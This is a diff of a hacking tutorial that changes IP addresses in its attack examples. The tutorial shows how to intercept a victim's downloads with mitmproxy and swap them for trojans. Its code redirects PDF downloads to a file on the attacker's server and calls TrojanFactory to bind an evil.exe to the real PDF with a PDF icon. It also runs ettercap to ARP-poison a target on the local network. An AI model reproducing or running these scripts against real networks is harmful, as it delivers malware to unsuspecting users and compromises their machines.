@@ -56,7 +56,7 @@ Note: here we print out the pretty_url of the request property of the flow objec
         #code to handle request flows
         if flow.request.pretty_url.endswith(".pdf"):
             print("[+] Got an intriguing flow")
-            flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.262.5/file.zip"})
+            flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.232.5/file.zip"})
     ```
 Note: the make method takes 3 arguments, the first argument is http status code, second is content, and third is headers. Here, we use status code 301 which is "moved permanently", refer this [link](https://en.wikipedia.org/wiki/HTTP_301) for more info. I set the header name to the location of the fake file. Here, in order to replace the target file response with the fake file response, I provide a direct URL to the fake file and it is stored in my own web server. If you notice we did not modify the second parameter (content) because we are redirecting the user to a different location.
 
@@ -66,9 +66,9 @@ Note: the make method takes 3 arguments, the first argument is http status code,
 
     def request(flow):
         #code to handle request flows
-        if flow.request.host != "10.15.262.5" and flow.request.pretty_url.endswith(".pdf"):
+        if flow.request.host != "10.15.232.5" and flow.request.pretty_url.endswith(".pdf"):
             print("[+] Got an intriguing flow")
-            flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.262.5/file.zip"})
+            flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.232.5/file.zip"})
     ```
 Note: here the host is the IP address or domain name of where my web server is hosted.
 
@@ -95,7 +95,7 @@ The only thing we need to do is change the file extension... which I will cover 
 
 4. We will start off by running TrojanFactory. Along with the command, we will specify the location of the file that we will display for the target client. (For this documentation I will use a adobe acrobat reader readme PDF file as the normal file since it is conveniently stored on the internet and has a *direct URL* to the file. Also, I will host my evil file on my web server so TrojanFactory can combine it with the normal file.)
     ```shell
-    python trojan_factory.py -f https://pubs.usgs.gov/dds/dds-057/ReadMe.pdf -e http://10.15.262.5/evil.exe -o /var/www/html/ReadResult.exe -i /root/Downloads/pdf.ico -z
+    python trojan_factory.py -f https://pubs.usgs.gov/dds/dds-057/ReadMe.pdf -e http://10.15.232.5/evil.exe -o /var/www/html/ReadResult.exe -i /root/Downloads/pdf.ico -z
     ```
 Note: here -f to specify the location of normal file, -e is to specify the location of evil file, -o is the location to store the result, -i is the location of the Trojan icon that is to be used, here I am using a PDF icon since the target download extension is a PDF. and -z to zip the file. Type in "python trojan_factory.py --help" for more info.
 
@@ -107,21 +107,21 @@ Note: here -f to specify the location of normal file, -e is to specify the locat
 
     def request(flow):
         #code to handle request flows
-        if flow.request.host != "10.15.262.5" and flow.request.pretty_url.endswith(".pdf"):
+        if flow.request.host != "10.15.232.5" and flow.request.pretty_url.endswith(".pdf"):
             print("[+] Got an intriguing flow")
 
             front_file = flow.request.pretty_url + "#"
 
-            subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f '" + front_file + "' -e http://10.15.262.5/evil.exe -o /var/www/html/file.exe# -i /root/Downloads/pdf.ico", shell=True)
+            subprocess.call("python /opt/TrojanFactory/trojan_factory.py -f '" + front_file + "' -e http://10.15.232.5/evil.exe -o /var/www/html/file.exe# -i /root/Downloads/pdf.ico", shell=True)
 
-            flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.262.5/file.zip"})
+            flow.reponse = mitmproxy.http.HTTPResponse.make(301, "", {"Location":"http://10.15.232.5/file.zip"})
     ```
 Note: I am using subprocess.call to run a bash command, here, I am appending the full path to TrojanFactory since I am trying to access it outside the directory. -f is the front file that will be displayed to the user (in this I am creating a variable, storing the value of the file that the user downloads in that variable, and then I am using that variable for -f). Hence, I have created the variable called front_file and thats going to be equal to the file that the user is downloading. -e is the evil file which is stored in my /var/www/html. -o is the location to store the result, -i is the location of the Trojan icon that is to be used. If you look closely, I am using a hash sign for -f and -e file so that it does not get intercepted in the if condition and the code does not get stuck in a loop.
 
 **Testing Script On A Remote Computer To Replace Downloads With a Trojan.**
 1. Now that we know how to create trojans and we have a working script that will replace downloads on the fly with any file that we want, lets test this script against a remote computer. We will start by running an ARP spoofing attack against the client computer using Ettercap. (Note: we can use MTIMproxy whenever we are the man in the middle, hence it can be used with ARP spoofing attack, with Fake AP or rather with any other scenario. For convenience, we will use Ettercap to become the man in the middle.)
     ```shell
-    ettercap -Tq -M arp:oneway -i wlan0 -S /10.15.162.1// /10.15.162.9//
+    ettercap -Tq -M arp:oneway -i wlan0 -S /10.15.232.1// /10.15.232.9//
     ```
 (Note: the above command will silently execute an ARP poison attack using the interface wlan0 and the -S is so that it does not forge an SSL certificate.)
 
